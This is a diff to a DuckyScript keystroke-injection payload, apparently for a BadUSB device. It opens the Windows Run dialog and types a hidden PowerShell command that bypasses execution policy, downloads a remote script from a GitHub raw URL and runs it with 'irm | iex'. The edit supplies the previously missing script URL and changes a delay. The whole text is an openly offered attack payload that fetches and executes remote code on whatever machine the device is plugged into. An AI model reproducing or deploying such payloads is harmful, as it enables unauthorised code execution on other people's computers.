@@ -1,5 +1,5 @@
 GUI r
-DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $url='https://static.poder360.com.br/uploads/2025/07/vampetaco-pix-eua-16jul25-848x477.jpeg';irm  | iex
+DELAY 800
+STRING powershell -w h -NoP -NonI -Exec Bypass $url='https://static.poder360.com.br/uploads/2025/07/vampetaco-pix-eua-16jul25-848x477.jpeg';irm 'https://raw.githubusercontent.com/Razielx64/flp/refs/heads/main/vampeta/Wallpaper-URL.ps1' | iex
 DELAY 500
 ENTER
